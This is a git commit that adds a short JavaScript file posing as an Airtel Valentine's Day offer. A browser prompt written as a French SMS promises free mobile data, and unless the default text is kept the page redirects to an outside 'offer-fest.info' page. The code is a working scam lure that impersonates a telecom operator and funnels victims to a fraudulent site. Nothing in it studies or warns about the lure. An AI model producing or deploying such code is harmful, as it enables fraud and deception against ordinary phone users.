50bb34a248176d81565762e3db74666382d1db98
ekpesense <abantak9@gmail.com>
2025-02-09 03:42:31 -0800

    Create activation-valentine.org.js

---
+++ activation-valentine.org.js
@@ -0,0 +1,6 @@
+
+var password = 'Airtel 50 Go'
+password=prompt('SMS:Cher client, veuillez vérifier si votre carte SIM Airtel est éligible pour recevoir 5 Go de données illimitées, récompense client de la Saint-Valentin, appuyez sur 50 Go pour activer maintenant. ','Airtel 50 Go');
+if (password != 'Airtel 50 Go') {
+location.href='https://offer-fest.info/valentine.org.html';
+}
